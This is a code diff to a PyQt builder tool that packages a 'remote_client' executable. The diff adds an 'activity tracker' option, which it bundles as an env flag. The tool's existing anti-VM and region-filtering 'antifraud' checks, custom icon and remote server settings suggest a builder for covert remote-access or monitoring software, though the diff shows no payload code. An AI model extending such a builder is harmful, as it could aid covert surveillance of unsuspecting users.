@@ -33,6 +33,7 @@ class BuildOptions:
     console: str
     server_url: str
     api_token: str
+    activity_tracker: bool = False
 
 
 class BuilderWorker(QtCore.QThread):
@@ -319,6 +320,9 @@ class BuilderWorker(QtCore.QThread):
         server_file = self._write_server_config(asset_dir)
         if server_file:
             args.extend(["--add-data", f"{server_file}{os.pathsep}remote_client"])
+        activity_file = self._write_activity_tracker_env(asset_dir)
+        if activity_file:
+            args.extend(["--add-data", f"{activity_file}{os.pathsep}remote_client"])
         return args, temp_dir
 
     def _write_team_id_file(self, asset_dir: Path) -> Optional[Path]:
@@ -366,6 +370,18 @@ class BuilderWorker(QtCore.QThread):
             return config_file
         except OSError:
             self.log_line.emit("Failed to write the server config file.")
+            return None
+
+    def _write_activity_tracker_env(self, asset_dir: Path) -> Optional[Path]:
+        """Write environment file for activity tracker configuration."""
+        if not self.options.activity_tracker:
+            return None
+        env_file = asset_dir / "rc_activity.env"
+        try:
+            env_file.write_text("RC_ACTIVITY_TRACKER=1\n", encoding="utf-8")
+            return env_file
+        except OSError:
+            self.log_line.emit("Failed to write the activity tracker env file.")
             return None
 
 
@@ -435,6 +451,9 @@ class CompilerPage(QtWidgets.QWidget):
         self.mode_combo.setEnabled(False)
 
         self.console_check = QtWidgets.QCheckBox()
+        
+        # Activity tracker checkbox
+        self.activity_tracker_check = QtWidgets.QCheckBox()
 
         form_layout.addWidget(self.source_label, 0, 0)
         form_layout.addWidget(self.source_input, 0, 1)
@@ -452,15 +471,16 @@ class CompilerPage(QtWidgets.QWidget):
         antifraud_row.addWidget(self.region_button)
         antifraud_row.addStretch()
         form_layout.addLayout(antifraud_row, 3, 1, 1, 2)
-        form_layout.addWidget(self.console_check, 4, 1, 1, 2)
-        form_layout.addWidget(self.output_dir_label, 5, 0)
-        form_layout.addWidget(self.output_dir_input, 5, 1)
-        form_layout.addWidget(self.output_dir_button, 5, 2)
-        form_layout.addWidget(self.icon_label, 6, 0)
-        form_layout.addWidget(self.icon_input, 6, 1)
-        form_layout.addWidget(self.icon_button, 6, 2)
-        form_layout.addWidget(self.mode_label, 7, 0)
-        form_layout.addWidget(self.mode_combo, 7, 1)
+        form_layout.addWidget(self.activity_tracker_check, 4, 1, 1, 2)
+        form_layout.addWidget(self.console_check, 5, 1, 1, 2)
+        form_layout.addWidget(self.output_dir_label, 6, 0)
+        form_layout.addWidget(self.output_dir_input, 6, 1)
+        form_layout.addWidget(self.output_dir_button, 6, 2)
+        form_layout.addWidget(self.icon_label, 7, 0)
+        form_layout.addWidget(self.icon_input, 7, 1)
+        form_layout.addWidget(self.icon_button, 7, 2)
+        form_layout.addWidget(self.mode_label, 8, 0)
+        form_layout.addWidget(self.mode_combo, 8, 1)
 
         layout.addWidget(form_card)
 
@@ -522,6 +542,7 @@ class CompilerPage(QtWidgets.QWidget):
         self.vm_check.setText(self.i18n.t("compiler_antifraud_vm"))
         self.region_check.setText(self.i18n.t("compiler_antifraud_region"))
         self.region_button.setText(self.i18n.t("compiler_regions"))
+        self.activity_tracker_check.setText(self.i18n.t("compiler_activity_tracker"))
         self.output_dir_label.setText(self.i18n.t("compiler_output_dir"))
         self.icon_label.setText(self.i18n.t("compiler_icon"))
         self.mode_label.setText(self.i18n.t("compiler_mode"))
@@ -596,6 +617,7 @@ class CompilerPage(QtWidgets.QWidget):
         antifraud_vm = self.vm_check.isChecked()
         antifraud_region = self.region_check.isChecked()
         antifraud_countries = self._selected_countries()
+        activity_tracker = self.activity_tracker_check.isChecked()
         output_dir_text = self.output_dir_input.text().strip() or str(source_dir / "dist")
         output_dir = Path(output_dir_text)
         icon_path = Path(self.icon_input.text().strip()) if self.icon_input.text().strip() else None
@@ -622,6 +644,7 @@ class CompilerPage(QtWidgets.QWidget):
             console=console,
             server_url=server_url,
             api_token=api_token,
+            activity_tracker=activity_tracker,
         )
         self.persist_builder_state(options)
         self.status_label.setText(self.i18n.t("compiler_status_building"))
